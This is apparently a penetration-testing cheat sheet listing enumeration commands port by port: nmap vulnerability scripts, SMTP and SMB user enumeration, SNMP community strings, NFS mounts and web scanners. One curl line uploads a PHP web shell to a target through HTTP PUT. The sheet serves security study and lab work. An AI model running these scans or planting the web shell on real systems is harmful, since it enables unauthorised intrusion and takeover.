# Linux  Common Port enumeration

## Various initial Port Scans

Syn-Stealth Scan							
```
nmap -sS $TARGETIP
```
Scan all ports (slow)	 				
```
nmap -p- $TARGETIP
```
Service version, run default scripts, OS thumbprinting. Usually run on individual ports for further info.	
```
nmap -sV -sC -O $TARGETIP -p $PORTNO
```
UDP port Scans (nmap slow, unicorn scan very quick)	
```
nmap $TARGETIP -sU
```
Quick aggressive scan on all ports using potentially noisy/unsafe scripts	nmap 
```
$TARGETIP -p- -A -T4 -sC
```

## Port 21 - FTP
Test for FTP Banner, Version and anonymous login. Also checks for basic FTP known vulns
```
nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $TARGETIP
```
## Port 22 - SSH
Usually unexploitable. Potential exploits for very old versions. Can often be exploited for username enumeration. Also sometimes just worth connecting to for custom SSH banners. Look for version exploits. Private Key Exploits or user enumeration exploits. 

## Port 25 - SMTP
Connect to mail server. Dont use dns direct connect, verbose output
```
nc -nvv $IP 25
HELO junk <cr><lf>
```

Once connected if able to. use to vrfy domain/potential users
```
telnet $IP 25  -->  VRFY $USERNAME
```

nmap scan to test for basic smtp exploits and attempt to enumerate users.
```
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $IP
```

## Port 69 - UDP  - TFTP 
Used for tftp-server

## Port 110 - Pop3
Usefull if you have mail/user credentials. Can be used to retrieve mail. Alternativly map to server with Evolution or other mail client.
```
telnet $IP 110
USER user@$IP/DOMAIN
PASS  $PASSWORD
or:
USER $USERNAME
PASS $PASSWORD
# List all emails
list
# Retrieve email number 5, for example
retr 5
```

## Port 111 - RPCbind
Can sometimes disclose information regarding the machine
```
rpcinfo -p $IP
```

## Port 135 - MSRPC
Check version number some versions are vulnerable

## Port 143 - imap

## Port 139/445 - SMB

Nmap aggressive tests and vulnerability test.
```
nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse $IP -p 445
```
enum4linux checks (unauthenticataed)
```
enum4linux -a $IP
```
rpc client and following commands authentication required
```
rpcclient -U "$USERNAME" $IP
srvinfo
enumdomusers
getdompwinfo
querydominfo
netshareenum
netshareenumall
smbclient -L $IP
```
Possible SMB shares to try	smbclient //$IP/tmp
```
smbclient \\\$IP\\ipc$ -U $USERNAME
smbclient //$IP/ipc$ -U $USERNAME
```
## Port 161/162 UDP - SNMP
aggressive snmp nmap test scan. 
```
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $IP
```
snmp-check will carry out tests and spit info. Can customise the -c flag with any common community string or if known the used string for that domain/machine. Common ones are public, private, community.
```
snmp-check -t $IP -c public
```
## Port 554 - RTSP
Check version number some versions are vulnerable

## Port 1030/1032/1033/1038
Used by RPC to connect in a domain network

## Port 1521 - Oracle Database
Try and grab version header or remote connect. 

## Port 2049 - NFS
Show the NFS mounts
```
showmount -e $IP
#mount
mount $IP:/ /tmp/NFS or mount -t $IP:/ /tmp/NFS
```

## Port 2100 - Oracle XML DB
default passwords 	https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm

## Port 3306 - MySQL
Nmap aggressive script and vuln test
```
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse $IP -p 3306
```

## Port 3339 - Oracle Web ui

## Port 80 - WEB
Nikto vuln scan
```
nikto -h http://$IP
#with proxy
nikto -h $TARGETIP -useproxy http://$LOCALIP:8080
```
WPS Scan
```
WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
wpscan --url http://$IP
wpscan --url http://$IP --enumerate vp
wpscan --url http://$IP --enumerate vt
wpscan --url http://$IP --enumerate u
```
Joomscan
```
joomscan -u  http://$IP
joomscan -u  http://$IP --enumerate-components
```
Curl
```
# Get header
curl -i $IP
# Get all info
curl -i -L $IP
# check for title and links
curl $IP -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
# look at page text only
curl $IP -s -L | html2text -width '99' | uniq
# Check if it is possible to upload
curl -v -X OPTIONS http://$IP/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$IP/test/shell.php
```
Dirb
```
# dirb bruteforce hidden directories
dirb http://$IP
```
Gobuster
gobuser brute for directories (good list) also returns status code's. Customise -s flag with what codes you want to see e.g 403.
```
gobuster -w /usr/share/wordlists/dirbuster/$DIRECTORYLIST -h http://$IP -s '200,204,301,302,307,403,500' -e
```

## Port 443 - SSL 
Check for heartbleed vuln
```
sslscan $IP:443
```




